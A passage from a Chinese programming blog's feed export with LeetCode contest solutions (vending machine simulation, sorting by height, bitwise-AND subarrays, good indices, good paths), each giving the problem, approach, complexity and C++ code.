<p>解释：<br><code>VendingMachine sys = new VendingMachine();</code><br><code>sys.addItem(0,3,&quot;Apple&quot;,10,10);</code> &#x2F;&#x2F; 时刻 <code>0</code> ，添加 <code>3</code> 个 <code>Apple</code>，价格为 <code>10</code>，保质期为 <code>10</code>。<br><code>sys.sell(1,&quot;Tom&quot;,&quot;Apple&quot;,1);</code> &#x2F;&#x2F; 时刻 <code>1</code> ，用户 <code>Tom</code> 购买 <code>1</code> 个 <code>Apple</code>， 支付 <code>10</code> ：。<br><code>sys.sell(2,&quot;Tom&quot;,&quot;Apple&quot;,3);</code> &#x2F;&#x2F; 时刻 <code>2</code> ，售货机中 <code>Apple</code> 数量为 <code>2</code> ，用户 <code>Tom</code> 购买失败，返回 <code>-1</code>。<br><code>sys.sell(3,&quot;Mary&quot;,&quot;Banana&quot;,2);</code> &#x2F;&#x2F; 时刻 <code>3</code> ，售货机中没有 <code>Banana</code> ，用户 <code>Mary</code> 购买失败，返回 <code>-1</code>。<br><code>sys.sell(11,&quot;Jim&quot;,&quot;Apple&quot;,1);</code> &#x2F;&#x2F; 时刻 <code>11</code> ，售货机中的 <code>Apple</code> 全部过期，用户 <code>Jim</code> 购买失败，返回 <code>-1</code>。</p>
</blockquote>
<p><strong>示例 2：</strong></p>
<blockquote>
<p>输入：<br><code>[&quot;VendingMachine&quot;,&quot;addItem&quot;,&quot;addItem&quot;,&quot;sell&quot;,&quot;addItem&quot;,&quot;sell&quot;,&quot;sell&quot;,&quot;sell&quot;,&quot;addItem&quot;,&quot;sell&quot;,&quot;sell&quot;]</code><br><code>[[],[0,1,&quot;Apple&quot;,4,3],[1,3,&quot;Apple&quot;,4,2],[2,&quot;Mary&quot;,&quot;Apple&quot;,2],[2,1,&quot;Banana&quot;,2,5],[4,&quot;Jim&quot;,&quot;Banana&quot;,2],[4,&quot;Mary&quot;,&quot;Banana&quot;,1],[4,&quot;Mary&quot;,&quot;Apple&quot;,1],[6,200,&quot;Apple&quot;,2,5],[6,&quot;Jim&quot;,&quot;Apple&quot;,100],[7,&quot;Mary&quot;,&quot;Apple&quot;,100]]</code></p>
<p>输出: <code>[null,null,null,8,null,-1,2,-1,null,200,196]</code></p>
<p>解释：<br><code>VendingMachine sys = new VendingMachine();</code><br><code>sys.addItem(0,1,&quot;Apple&quot;,4,3);</code> &#x2F;&#x2F; 时刻 <code>0</code> ，添加 <code>1</code> 个 <code>Apple</code>，价格为 <code>4</code>，保质期为 <code>3</code>。<br><code>sys.addItem(1,3,&quot;Apple&quot;,4,2);</code> &#x2F;&#x2F; 时刻 <code>1</code> ，添加 <code>3</code> 个 <code>Apple</code>，价格为 <code>4</code>，保质期为 <code>2</code>。<br><code>sys.sell(2,&quot;Mary&quot;,&quot;Apple&quot;,2);</code> &#x2F;&#x2F; 时刻 <code>2</code> ，用户 <code>Mary</code> 购买 <code>2</code> 个 <code>Apple</code>，支付 <code>8</code>。<br><code>sys.addItem(2,1,&quot;Banana&quot;,2,5);</code> &#x2F;&#x2F; 时刻 <code>2</code> ，添加 <code>1</code> 个 <code>Banana</code>，价格为 <code>2</code>，保质期为 <code>5</code>。<br><code>sys.sell(4,&quot;Jim&quot;,&quot;Banana&quot;,2);</code> &#x2F;&#x2F; 时刻 <code>4</code> ，售货机中 <code>Banana</code> 数量为 <code>1</code> ，用户 <code>Jim</code> 购买失败，返回 <code>-1</code>。<br><code>sys.sell(4,&quot;Mary&quot;,&quot;Banana&quot;,1);</code> &#x2F;&#x2F; 时刻 <code>4</code> ，用户 <code>Mary</code> 购买 <code>1</code> 个 <code>Banana</code>，享受 1% 的优惠，向上取整后为 <code>2</code><br><code>sys.sell(4,&quot;Mary&quot;,&quot;Apple&quot;,1);</code> &#x2F;&#x2F; 时刻 <code>4</code> ，售货机中的 <code>Apple</code> 全部过期，用户 <code>Mary</code> 购买失败，返回 <code>-1</code>。<br><code>sys.addItem(6,200,&quot;Apple&quot;,2,5);</code> &#x2F;&#x2F; 时刻 <code>6</code> ，添加 <code>200</code> 个 <code>Apple</code>，价格为 <code>2</code>，保质期为 <code>5</code>。<br><code>sys.sell(6,&quot;Jim&quot;,&quot;Apple&quot;,100);</code> &#x2F;&#x2F; 时刻 <code>6</code> ，用户 <code>Jim</code> 购买 <code>100</code> 个 <code>Apple</code>。返回 200<br><code>sys.sell(7,&quot;Mary&quot;,&quot;Apple&quot;,100);</code> &#x2F;&#x2F; 时刻 <code>7</code> ，用户 <code>Mary</code> 购买 <code>100</code> 个 <code>Apple</code>，可享受 2% 的优惠。返回196</p>
</blockquote>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= item.length,customer.length &lt;= 10</code>，<code>item</code> 和 <code>customer</code> 中只包含英文字母</li>
<li><code>1 &lt;= duration,price,number &lt;= 10^6</code></li>
<li><code>0 &lt;= time &lt;= 10^6</code></li>
<li><code>addItem</code> 和 <code>sell</code> 的总调用次数不超过 <code>1000</code> 次</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/NyZD2B/">https://leetcode.cn/contest/cnunionpay2022/problems/NyZD2B/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p>堆 + 直接模拟</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目本身不是很难，我们需要统计每个顾客的购买次数，并同时存储每个批次的商品。<ul>
<li>每次添加产品时，将产品的价格、过期时间、数量作为一个批次添加到商品的信息中，并按照价格、过期时间、数量进行排序即可；</li>
<li>每次购买商品时，首先将当前商品中的过期的批次全部剔除掉，然后统计剩余的产品数量是否满足顾客的购买要求，如果不能满足购买要求则直接返回；</li>
<li>如果满足购买要求，依次按照题目要求的顺序从存储的货物中挑选适合数量的产品，并将每个批次的数量按照题目依次进行剔除掉。</li>
<li>在此我们为了方便计算使用 <code>treeset</code> 保存相关数据。</li>
</ul>
</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2)$，其中 $n$ 表示 <code>addItem</code> 的执行次数。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示 <code>addItem</code> 的执行次数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">VendingMachine</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">VendingMachine</span>() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addItem</span><span class="params">(<span class="type">int</span> time, <span class="type">int</span> number, string item, <span class="type">int</span> price, <span class="type">int</span> duration)</span> </span>&#123;</span><br><span class="line">        cnt[item].<span class="built_in">emplace</span>(price, time + duration, number);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">sell</span><span class="params">(<span class="type">int</span> time, string customer, string item, <span class="type">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> total = <span class="number">0</span>;</span><br><span class="line">        vector&lt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [sPrice, sDuration, sNumber] : cnt[item]) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sDuration &lt; time) &#123;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(sPrice, sDuration, sNumber);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                total += sNumber;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : arr) &#123;</span><br><span class="line">            cnt[item].<span class="built_in">erase</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (total &lt; number) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> it = cnt[item].<span class="built_in">begin</span>(); it != cnt[item].<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (number &gt;= <span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(*it)) &#123;</span><br><span class="line">                ans += (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(*it) * <span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(*it);</span><br><span class="line">                number -= <span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(*it);</span><br><span class="line">                cnt[item].<span class="built_in">erase</span>(it);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">auto</span> t = <span class="built_in">make_tuple</span>(<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(*it), <span class="built_in">get</span>&lt;<span class="number">1</span>&gt;(*it), <span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(*it) - number);</span><br><span class="line">                ans += (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(*it) * number;</span><br><span class="line">                cnt[item].<span class="built_in">erase</span>(it);</span><br><span class="line">                number = <span class="number">0</span>;</span><br><span class="line">                cnt[item].<span class="built_in">emplace</span>(t);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (number == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> freq = buyCnt[customer];</span><br><span class="line">        buyCnt[customer]++;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ceil</span>((<span class="type">double</span>) ans * (<span class="number">100.0</span> - freq) / <span class="number">100.0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_map&lt;string, <span class="type">int</span>&gt; buyCnt;</span><br><span class="line">    unordered_map&lt;string, set&lt;tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt; cnt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 312</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/37/</url>
    <content><![CDATA[<h2 id="leetcode-contest-312"><a href="#leetcode-contest-312" class="headerlink" title="leetcode contest 312"></a>leetcode contest 312</h2><p>周赛题目质量不错的一次，不过排名也100往后了，还是思路不够快。</p>
<h4 id="6188-按身高排序"><a href="#6188-按身高排序" class="headerlink" title="6188. 按身高排序"></a>6188. 按身高排序</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个字符串数组 <code>names</code> ，和一个由 互不相同 的正整数组成的数组<code> heights</code> 。两个数组的长度均为 <code>n</code> 。</p>
<p>对于每个下标 <code>i</code>，<code>names[i]</code> 和 <code>heights[i]</code> 表示第 <code>i</code> 个人的名字和身高。</p>
<p>请按身高 降序 顺序返回对应的名字数组 <code>names</code> 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：names = [&quot;Mary&quot;,&quot;John&quot;,&quot;Emma&quot;], heights = [180,165,170]</span><br><span class="line">输出：[&quot;Mary&quot;,&quot;Emma&quot;,&quot;John&quot;]</span><br><span class="line">解释：Mary 最高，接着是 Emma 和 John 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：names = [&quot;Alice&quot;,&quot;Bob&quot;,&quot;Bob&quot;], heights = [155,185,150]</span><br><span class="line">输出：[&quot;Bob&quot;,&quot;Alice&quot;,&quot;Bob&quot;]</span><br><span class="line">解释：第一个 Bob 最高，然后是 Alice 和第二个 Bob 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == names.length == heights.length</code></li>
<li><code>1 &lt;= n &lt;= 103</code></li>
<li><code>1 &lt;= names[i].length &lt;= 20</code></li>
<li><code>1 &lt;= heights[i] &lt;= 105</code></li>
<li><code>names[i]</code> 由大小写英文字母组成</li>
<li><code>heights</code> 中的所有值互不相同</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-312/problems/sort-the-people/">https://leetcode.cn/contest/weekly-contest-312/problems/sort-the-people/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>排序
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>按照题目要求进行排序即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n \log n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">sortPeople</span><span class="params">(vector&lt;string&gt;&amp; names, vector&lt;<span class="type">int</span>&gt;&amp; heights)</span> </span>&#123;</span><br><span class="line">        vector&lt;pair&lt;string, <span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; names.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(names[i], heights[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>(), [](<span class="type">const</span> pair&lt;string, <span class="type">int</span>&gt; &amp;a, <span class="type">const</span> pair&lt;string, <span class="type">int</span>&gt; &amp;b) &#123;</span><br><span class="line">           <span class="keyword">return</span> a.second &gt; b.second; </span><br><span class="line">        &#125;);</span><br><span class="line">        vector&lt;string&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [name, _] : arr) &#123;</span><br><span class="line">            ans.<span class="built_in">emplace_back</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6189-按位与最大的最长子数组"><a href="#6189-按位与最大的最长子数组" class="headerlink" title="6189. 按位与最大的最长子数组"></a>6189. 按位与最大的最长子数组</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个长度为 <code>n</code> 的整数数组 <code>nums</code> 。</p>
<p>考虑 <code>nums</code> 中进行 按位与<code>（bitwise AND）</code>运算得到的值 最大 的 非空 子数组。</p>
<p>换句话说，令 <code>k</code> 是 <code>nums</code> 任意 子数组执行按位与运算所能得到的最大值。那么，只需要考虑那些执行一次按位与运算后等于 <code>k</code> 的子数组。<br>返回满足要求的 最长 子数组的长度。</p>
<p>数组的按位与就是对数组中的所有数字进行按位与运算。</p>
<p>子数组 是数组中的一个连续元素序列。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,3,2,2]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">子数组按位与运算的最大值是 3 。</span><br><span class="line">能得到此结果的最长子数组是 [3,3]，所以返回 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,4]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">子数组按位与运算的最大值是 4 。 </span><br><span class="line">能得到此结果的最长子数组是 [4]，所以返回 1 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 106</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/">https://leetcode.cn/contest/cnunionpay2022/problems/6olJmJ/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>连续子数组与运算的最大值即为数组的最大值 $maxV$，数组的最大值与上任何元素的结果均小于等于它本身，因此我们的目标即为找到连续 $maxV$ 的最大长度即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$。</li>
<li>空间复杂度：空间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestSubarray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> maxN = *<span class="built_in">max_element</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == maxN) &#123;</span><br><span class="line">                <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (i &lt; n &amp;&amp; nums[i] == maxN) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                    tot++;</span><br><span class="line">                &#125;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, tot);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6190-找到所有好下标"><a href="#6190-找到所有好下标" class="headerlink" title="6190. 找到所有好下标"></a>6190. 找到所有好下标</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个大小为 <code>n</code> 下标从 <code>0</code> 开始的整数数组 <code>nums</code> 和一个正整数 <code>k</code> 。</p>
<p>对于 <code>k &lt;= i &lt; n - k</code> 之间的一个下标 <code>i</code> ，如果它满足以下条件，我们就称它为一个 好 下标：</p>
<ul>
<li>下标 <code>i</code> 之前 的 <code>k</code> 个元素是 非递增的 。</li>
<li>下标 <code>i</code> 之后 的 <code>k</code> 个元素是 非递减的 。<br>按 升序 返回所有好下标。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,1,1,1,3,4,1], k = 2</span><br><span class="line">输出：[2,3]</span><br><span class="line">解释：数组中有两个好下标：</span><br><span class="line">- 下标 2 。子数组 [2,1] 是非递增的，子数组 [1,3] 是非递减的。</span><br><span class="line">- 下标 3 。子数组 [1,1] 是非递增的，子数组 [3,4] 是非递减的。</span><br><span class="line">注意，下标 4 不是好下标，因为 [4,1] 不是非递减的。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,1,1,2], k = 2</span><br><span class="line">输出：[]</span><br><span class="line">解释：数组中没有好下标。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == nums.length</code></li>
<li><code>3 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 106</code></li>
<li><code>1 &lt;= k &lt;= n / 2</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-312/problems/find-all-good-indices/">https://leetcode.cn/contest/weekly-contest-312/problems/find-all-good-indices/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>滑动窗口
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目本身比较简单，对于每个位置的 $i$，我们找到 $i$ 的左侧连续非递增的最大长度为 $left[i]$，我们找到 $i$ 的右侧连续非递减的最大长度为 $right[i]$，对于每个索引 $i$ 处，只需要满足：<br>$$<br>left[i-1] &gt;&#x3D; k, right[i+1] &gt;&#x3D; k<br>$$<br>则索引 $i$ 即可满足要求。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(n)$，$n$ 为数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">goodIndices</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">left</span><span class="params">(n, <span class="number">1</span>)</span>, <span class="title">right</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; nums[i<span class="number">-1</span>]) &#123;</span><br><span class="line">                left[i] = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left[i] = left[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; nums[i+<span class="number">1</span>]) &#123;</span><br><span class="line">                right[i] = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right[i] = right[i + <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; n - k; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (left[i - <span class="number">1</span>] &gt;= k &amp;&amp; right[i + <span class="number">1</span>] &gt;= k) &#123;</span><br><span class="line">                ans.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6191-好路径的数目"><a href="#6191-好路径的数目" class="headerlink" title="6191. 好路径的数目"></a>6191. 好路径的数目</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一棵 <code>n </code>个节点的树（连通无向无环的图），节点编号从 <code>0</code> 到 <code>n - 1</code> 且恰好有 <code>n - 1</code> 条边。</p>
<p>给你一个长度为 <code>n</code> 下标从 <code>0</code> 开始的整数数组 <code>vals</code> ，分别表示每个节点的值。同时给你一个二维整数数组 <code>edges</code> ，其中 <code>edges[i] = [ai, bi]</code> 表示节点 <code>ai</code> 和 <code>bi</code> 之间有一条 无向 边。</p>
<p>一条 好路径 需要满足以下条件：</p>
<ul>
<li>开始节点和结束节点的值 相同 。</li>
<li>开始节点和结束节点中间的所有节点值都 小于等于 开始节点的值（也就是说开始节点的值应该是路径上所有节点的最大值）。<br>请你返回不同好路径的数目。<br>注意，一条路径和它反向的路径算作 同一 路径。比方说， <code>0 -&gt; 1</code> 与 <code>1 -&gt; 0</code> 视为同一条路径。单个节点也视为一条合法路径。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：vals = [1,3,2,1,3], edges = [[0,1],[0,2],[2,3],[2,4]]</span><br><span class="line">输出：6</span><br><span class="line">解释：总共有 5 条单个节点的好路径。</span><br><span class="line">还有 1 条好路径：1 -&gt; 0 -&gt; 2 -&gt; 4 。</span><br><span class="line">（反方向的路径 4 -&gt; 2 -&gt; 0 -&gt; 1 视为跟 1 -&gt; 0 -&gt; 2 -&gt; 4 一样的路径）</span><br><span class="line">注意 0 -&gt; 2 -&gt; 3 不是一条好路径，因为 vals[2] &gt; vals[0] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：vals = [1,1,2,2,3], edges = [[0,1],[1,2],[2,3],[2,4]]</span><br><span class="line">输出：7</span><br><span class="line">解释：总共有 5 条单个节点的好路径。</span><br><span class="line">还有 2 条好路径：0 -&gt; 1 和 2 -&gt; 3 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：vals = [1], edges = []</span><br><span class="line">输出：1</span><br><span class="line">解释：这棵树只有一个节点，所以只有一条好路径。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == vals.length</code></li>
<li><code>1 &lt;= n &lt;= 3 * 104</code></li>
<li><code>0 &lt;= vals[i] &lt;= 105</code></li>
<li><code>edges.length == n - 1</code></li>
<li><code>edges[i].length == 2</code></li>
<li><code>0 &lt;= ai, bi &lt; n</code></li>
<li><code>ai != bi</code></li>
<li><code>edges</code> 表示一棵合法的树。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-312/problems/number-of-good-paths/">https://leetcode.cn/contest/weekly-contest-312/problems/number-of-good-paths/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p>排序 + 加并查集</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目出的还可以，稍微有点思考难度。两点之间是否存在路径，最优先考虑到的是并查集，如果两个节点在同一个子集下，则两点之间一定存在路径，为了保证两点 $(a,b)$ 之间的路径上的节点值都满足小于等于 $vals[a],vals[b]$，则此时我们应当只把节点值小于 $vals[a]$ 的节点加入到并查集中，因此我们可以首先进行排序，按照每条边的节点值的最大值进行排序。</li>
<li>我们每次遍历当前节点值为 $x$ 时，我们将所有的边中的两个节点值都小于 $x$ 的边加入到并查集中，因为此时大于 $x$ 的边加入到并查集中无效，因为此时无法使用该条边。</li>
<li>对于对一个子集中且节点值相同的节点数目为 $cnt$，则此时可以构造题目要求的节点对的数目为 $\dfrac{cnt * (cnt + 1)}{2}$，因此我们将所有可能的节点对的数目相加即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m \log m + n \times \alpha(n))$，其中 $m$ 表示边的数目，$n$ 表示节点的数目。</li>
<li>空间复杂度：$O(n)$，$n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> data_structure</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// DisjointSet implements a (0-indexed) disjoint set. </span></span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">DisjointSet</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> n;</span><br><span class="line">		std::vector&lt;<span class="type">int</span>&gt; parent, size;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">explicit</span> <span class="title">DisjointSet</span><span class="params">(<span class="type">int</span> n)</span> : n(n), </span></span><br><span class="line"><span class="function">			parent(n), size(n)</span></span><br><span class="line"><span class="function">		&#123;</span></span><br><span class="line">			